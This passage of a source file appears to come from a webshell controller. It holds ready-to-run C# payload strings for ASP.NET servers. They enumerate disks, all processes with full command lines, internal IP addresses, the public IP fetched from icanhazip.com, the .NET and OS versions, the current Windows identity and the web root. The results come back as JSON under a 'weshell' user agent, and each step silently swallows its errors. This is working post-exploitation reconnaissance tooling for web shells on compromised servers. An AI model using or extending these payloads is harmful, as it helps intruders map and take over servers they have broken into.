string __disks="";try{foreach(var __o in new System.Management.ManagementObjectSearcher("SELECT DeviceID,Size,FreeSpace,FileSystem FROM Win32_LogicalDisk WHERE DriveType=3").Get()){string __fs=__o["FileSystem"]==null?"":__o["FileSystem"].ToString();string __dev=__o["DeviceID"]==null?"":__o["DeviceID"].ToString();double __tot=0,__free=0;if(__o["Size"]!=null)double.TryParse(__o["Size"].ToString(),out __tot);if(__o["FreeSpace"]!=null)double.TryParse(__o["FreeSpace"].ToString(),out __free);int __use=0;if(__tot>0)__use=(int)((1-__free/__tot)*100);__disks+="{\"fs\":"+WshE(__fs)+",\"total\":"+__tot.ToString()+",\"used\":"+((__tot-__free)).ToString()+",\"avail\":"+__free.ToString()+",\"use\":"+__use+",\"mount\":"+WshE(__dev+@"\")+"},";}}catch(System.Exception){}
if(__disks!="")__disks=__disks.Substring(0,__disks.Length-1);
string __procs="";try{foreach(var __o in new System.Management.ManagementObjectSearcher("SELECT ProcessId,ParentProcessId,Name,CommandLine,WorkingSetSize FROM Win32_Process").Get()){string __pid=__o["ProcessId"]==null?"":__o["ProcessId"].ToString();string __ppid=__o["ParentProcessId"]==null?"":__o["ParentProcessId"].ToString();string __cmd=__o["Name"]==null?"":__o["Name"].ToString();if(__o["CommandLine"]!=null){string __cl=__o["CommandLine"].ToString();if(__cl!="")__cmd=__cl;}double __ws=0;if(__o["WorkingSetSize"]!=null)double.TryParse(__o["WorkingSetSize"].ToString(),out __ws);double __mtot=0;try{foreach(var __mm in new System.Management.ManagementObjectSearcher("SELECT TotalVisibleMemorySize FROM Win32_OperatingSystem").Get()){double __tv=0;if(__mm["TotalVisibleMemorySize"]!=null)double.TryParse(__mm["TotalVisibleMemorySize"].ToString(),out __tv);__mtot=__tv*1024;}}catch(System.Exception){}double __mp=0;if(__mtot>0)__mp=Math.Round(__ws/__mtot*100,1);__procs+="{\"pid\":"+__pid+",\"ppid\":"+__ppid+",\"user\":\"\",\"cpu\":0,\"mem\":"+__mp.ToString()+",\"cmd\":"+WshE(__cmd)+"},";}}catch(System.Exception){}
if(__procs!="")__procs=__procs.Substring(0,__procs.Length-1);
string __iips="";try{foreach(var __o in new System.Management.ManagementObjectSearcher("SELECT IPAddress FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled=true").Get()){if(__o["IPAddress"]==null)continue;string[] __arr=(string[])__o["IPAddress"];foreach(var __a in __arr){if(__a==null)continue;if(__a.IndexOf(':')>=0)continue;if(__a.StartsWith("127"))continue;if(__a.StartsWith("169.254"))continue;if(__iips!="")__iips+=",";__iips+="\""+__a+"\"";}}}catch(System.Exception){}
string __pub="";try{using(var __wc=new System.Net.WebClient()){__wc.Headers.Add("User-Agent","weshell");__pub=__wc.DownloadString("https://icanhazip.com").Trim();}}catch(System.Exception){}if(__pub.Length>45)__pub="";
R.Write("{\"ok\":true,\"hostname\":"+WshE(__host)+",\"os\":"+WshE(__oscap)+",\"uptime\":"+__uptime.ToString()+",\"loadavg\":[],\"cpu\":{\"cores\":"+__cores+",\"model\":"+WshE(__model)+",\"usage\":"+__pu.ToString()+ "},\"mem\":{\"MemTotal\":"+__mt.ToString()+",\"MemAvailable\":"+__mf.ToString()+ "},\"disks\":["+__disks+"],\"procs\":["+__procs+"],\"intIPs\":["+__iips+"],\"pubIP\":"+WshE(__pub)+"}");`

// aspnetEnv 是 ASP.NET 环境能力研判：.NET 版本 / 操作系统 / 当前用户 / Web 服务 / 物理路径。
const aspnetEnv = `string __ver="";try{__ver=System.Environment.Version.ToString();}catch(System.Exception){}
string __os=System.Environment.OSVersion.VersionString;
string __user="";try{__user=System.Security.Principal.WindowsIdentity.GetCurrent().Name;}catch(System.Exception){}
string __server="";try{__server=HttpContext.Current.Request.ServerVariables["SERVER_SOFTWARE"]??"";}catch(System.Exception){}
string __doc="";try{__doc=HttpContext.Current.Request.PhysicalApplicationPath??"";}catch(System.Exception){}
R.Write("{\"kind\":\"aspnet\",\"ok\":true,\"dotNetVersion\":"+WshE(__ver)+",\"os\":"+WshE(__os)+",\"user\":"+WshE(__user)+",\"serverSoftware\":"+WshE(__server)+",\"docRoot\":"+WshE(__doc)+",\"anyExec\":true}");`
